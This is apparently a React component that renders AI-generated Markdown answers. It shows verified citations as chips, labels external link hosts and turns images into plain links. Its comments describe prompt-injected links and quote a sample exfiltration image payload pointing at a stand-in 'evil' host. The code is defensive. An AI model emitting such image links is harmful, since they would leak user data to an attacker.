import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { highlight } from '../../lib/style/highlight'
import { decode, headingId } from '../../lib/url'
import type { Citation } from '../../types/repo/code'
import type { Repo } from '../../types/repo/repo'
import { parseCitation, type CiteTarget } from '../repo/sourceLinks'
import { CitationChip } from './CitationChip'
import './source.css'

// The host of an external link, shown beside it: generated text may carry a prompt-injected link.
function hostOf(href?: string) {
  try {
    const url = new URL(href ?? '')
    return url.protocol === 'http:' || url.protocol === 'https:' ? url.host : ''
  } catch {
    return '' // relative, or not a URL
  }
}

/** Renders an answer or wiki page; links into repo's source that citations hold become citation chips. */
export function Markdown({ text, citations, repo, onCite }: { text: string; citations: Citation[]; repo: Pick<Repo, 'url'>; onCite: (c: CiteTarget) => void }) {
  return (
    <div className="markdown">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          a({ href, children }) {
            const c = parseCitation(href, repo)
            // The model can write a link into the source itself; only one the citations hold was checked.
            if (c && citations.some((v) => v.path === c.path && v.startLine === c.startLine && v.endLine === c.endLine)) {
              return <CitationChip {...c} onClick={() => onCite(c)} />
            }
            // In-page: stays in this tab, and reaches a wiki heading by the id it was given (WikiArticle).
            if (href?.startsWith('#')) return <a href={href === '#' ? href : '#' + headingId(decode(href.slice(1)))}>{children}</a>
            const host = hostOf(href)
            return (
              <a href={href} target="_blank" rel="noreferrer">
                {children}
                {host && children !== href && <span className="text-muted-foreground"> ({host})</span>}
              </a>
            )
          },
          // Generated text never loads an image: its URL could carry data away (a prompt-injected ![](https://evil/?q=…)).
          img({ src, alt }) {
            return typeof src === 'string' && src ? <a href={src} target="_blank" rel="noreferrer">{alt || src}</a> : <>{alt}</>
          },
          // A table wider than the text scrolls in its own box; its cells wrap between words.
          table({ children }) {
            return <div className="mb-[18px] overflow-x-auto"><table>{children}</table></div>
          },
          code({ className, children }) {
            const lang = /language-([\w.-]+)/.exec(className ?? '')?.[1]
            if (!lang) return <code>{children}</code>
            return <code className="hljs" dangerouslySetInnerHTML={{ __html: highlight(String(children).replace(/\n$/, ''), lang) }} />
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  )
}
